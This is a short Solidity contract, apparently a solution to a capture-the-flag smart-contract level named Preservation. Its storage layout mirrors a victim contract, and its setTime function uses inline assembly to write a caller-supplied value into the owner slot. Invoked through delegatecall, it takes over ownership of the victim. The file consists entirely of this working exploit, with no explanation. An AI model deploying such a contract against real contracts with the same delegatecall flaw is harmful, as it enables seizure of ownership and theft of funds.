// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.18;

contract PreservationExploit {
    address slot0;
    address slot1;
    address owner;

    function setTime(uint _time) public {
        // owner = address(uint160(_time));
        assembly {
            let mask := sub(exp(2, 160), 1)
            sstore(owner.slot, and(_time, mask))
        }
    }
}
